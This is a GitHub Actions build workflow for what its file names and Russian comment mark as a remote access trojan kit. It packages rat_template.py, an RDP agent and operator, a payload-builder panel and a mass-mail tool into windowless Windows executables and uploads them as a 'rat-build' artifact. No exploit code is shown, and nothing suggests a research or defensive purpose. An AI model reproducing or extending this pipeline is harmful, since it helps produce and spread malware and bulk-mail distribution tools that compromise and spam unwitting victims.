# language: YAML, file: .github/workflows/build.yml
# *собирает operator.exe, mass_mail.exe, panel.exe; payload — локально через панель*
name: build

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  windows-build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt

      - name: Syntax check
        run: python -m py_compile builder.py rat_template.py rdp_agent.py rdp_operator.py mass_mail.py panel.py

      - name: Build operator
        run: pyinstaller --onefile --noconsole --name operator --hidden-import=PyQt5.QtCore --hidden-import=PyQt5.QtGui --hidden-import=PyQt5.QtWidgets rdp_operator.py

      - name: Build mass_mail
        run: pyinstaller --onefile --noconsole --name mass_mail mass_mail.py

      - name: Build panel
        run: pyinstaller --onefile --noconsole --name panel --hidden-import=PyQt5.QtCore --hidden-import=PyQt5.QtGui --hidden-import=PyQt5.QtWidgets --add-data "rat_template.py;." --add-data "rdp_agent.py;." --add-data "rdp_operator.py;." --add-data "mass_mail.py;." panel.py

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: rat-build
          path: |
            dist/operator.exe
            dist/mass_mail.exe
            dist/panel.exe
          retention-days: 14
